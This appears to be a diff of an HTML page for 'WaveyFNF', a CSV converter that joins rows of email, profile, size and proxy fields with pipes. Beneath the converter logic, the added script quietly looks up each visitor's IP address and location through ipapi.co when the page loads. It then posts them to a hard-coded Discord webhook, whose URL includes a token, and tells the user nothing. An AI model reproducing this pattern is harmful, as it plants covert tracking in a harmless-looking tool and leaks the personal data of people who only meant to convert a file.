@@ -1,90 +1,158 @@
-<!DOCTYPE html>
 <html>
-<head>
-  <title>WaveyFNF CSV Converter</title>
-  <script>
-    function convertCsv() {
-      var input = document.getElementById("input").value;
-      var output = input.replace(/,/g, "|");
-      document.getElementById("output").value = output;
-    }
-    function handleFileSelect(evt) {
-      var files = evt.target.files; // FileList object
-      var reader = new FileReader();
-      reader.onload = function(e) {
-        document.getElementById('input').value = e.target.result;
+  <head>
+    <style>
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        font-family: Arial, sans-serif;
       }
-      reader.readAsText(files[0]);
-    }
-  </script>
-  <style>
-    /* Add some styling to the body */
-    body {
-      background-color: #f2f2f2;
-      font-family: Arial, sans-serif;
-      text-align: center;
-    }
-    /* Add some styling to the title */
-    h1 {
-      color: #4CAF50;
-    }
-    /* Add some styling to the form */
-    form {
-      margin: 0 auto;
-      width: 60%;
-      text-align: left;
-      padding: 20px;
-      background-color: #ffffff;
-      border-radius: 5px;
-    }
-    /* Add some styling to the input and output fields */
-    textarea {
-      width: 100%;
-      padding: 12px 20px;
-      margin: 8px 0;
-      box-sizing: border-box;
-      border-radius: 4px;
-      border: 1px solid #ccc;
-    }
-    /* Add some styling to the button */
-    button {
-      width: 100%;
-      background-color: #4CAF50;
-      color: white;
-      padding: 14px 20px;
-      margin: 8px 0;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-    /* Add some styling to the file input */
-    input[type=file] {
-      background-color: #f2f2f2;
-      padding: 12px 20px;
-      margin: 8px 0;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
-    }
-  </style>
-</head>
-<body>
-  <h1>WaveyFNF CSV Converter</h1>
-  <form>
-    <label>Input CSV:</label>
-    <br>
-    <textarea id="input" rows="4" cols="50"></textarea>
-    <br>
-    <br>
-    <input type="file" id="fileinput" onchange="handleFileSelect(event)" accept=".csv">
-    <br>
-    <br>
-    <label>Output:</label>
-    <br>
-    <textarea id="output" rows="4" cols="50" readonly></textarea>
-    <br>
-    <br>
-    <button type="button" onclick="convertCsv()">Convert CSV</button>
-  </form>
-</body>
-</html>
+
+      h1 {
+        margin-top: 50px;
+        font-size: 36px;
+      }
+
+      .input-section {
+        margin-top: 50px;
+        display: flex;
+        flex-direction: row;
+        align-items: center;
+        justify-content: center;
+      }
+
+      #input {
+        height: 200px;
+        width: 500px;
+        font-size: 18px;
+        padding: 10px;
+      }
+
+      #output {
+        height: 200px;
+        width: 500px;
+        font-size: 18px;
+        padding: 10px;
+        margin-left: 50px;
+        background-color: lightgrey;
+        border: none;
+        resize: none;
+        readonly
+      }
+
+      .btn {
+        margin-top: 50px;
+        padding: 20px;
+        font-size: 18px;
+        background-color: #4CAF50;
+        color: white;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+
+      .file-input {
+        margin-top: 50px;
+        height: 200px;
+        width: 500px;
+        border: 2px solid green;
+        border-radius: 5px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        font-size: 18px;
+      }
+
+      #fileInput {
+        display: none;
+      }
+
+      .file-input label {
+        cursor: pointer;
+        background-color: green;
+        color: white;
+        padding: 20px;
+        border-radius: 5px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>WaveyFNF</h1>
+    <div class="input-section">
+      <textarea id="input" rows="4" cols="50"></textarea>
+      <textarea id="output" rows="4" cols="50" readonly></textarea>
+    </div>
+    <button class="btn" id="convertButton">Convert</button>
+    <div class="file-input">
+      <input type="file" id="fileInput" />
+      <label for="fileInput">Upload a file</label>
+    </div>
+  </body>
+  <script>
+    const input = document.getElementById("input");
+    const output = document.getElementById("output");
+    const convertButton = document.getElementById("convertButton");
+    const fileInput = document.getElementById("fileInput");
+    
+    convertButton.addEventListener("click", () => {
+      let inputData = input.value;
+      let lines = inputData.split("\n");
+      let outputData = "";
+      for (let i = 0; i < lines.length; i++) {
+        let line = lines[i];
+        let columns = line.split(",");
+        let email = columns[0];
+        let profile = columns[1];
+        let size = columns[2];
+        let proxy = columns[3];
+        outputData += `${email} | ${profile} | ${size} | ${proxy}\n`;
+        console.log(`Converted line ${i + 1}`);
+      }
+      output.value = outputData;
+    });
+    
+    fileInput.addEventListener("change", () => {
+      const reader = new FileReader();
+      reader.onload = function () {
+        input.value = reader.result;
+      };
+      reader.readAsText(fileInput.files[0]);
+    });
+    
+    const discordWebhook = (location, ip) => {
+  const webhookUrl = "https://discord.com/api/webhooks/1040024446796308541/kZruOD-0Y5z9Yu0RHyc7mZyaWuqia5JSSVgDuNx5cO27vuHltmsdweuYhhYVJ7IqUXiZ";
+  const message = `The user's location is ${location} and their IP address is ${ip}.`;
+  
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      content: message,
+    }),
+  })
+    .then((response) => {
+      if (response.ok) {
+        console.log("Successfully sent Discord webhook.");
+      } else {
+        console.error("Failed to send Discord webhook.");
+      }
+    })
+    .catch((error) => {
+      console.error(`An error occurred: ${error}`);
+    });
+};
+
+    
+    fetch("https://ipapi.co/json/")
+      .then((response) => response.json())
+      .then((data) => {
+        const location = `${data.city}, ${data.region_code}, ${data.country_name}`;
+        const ip = data.ip;
+        discordWebhook(location, ip);
+      });
+    </script>
+    </html>
+    
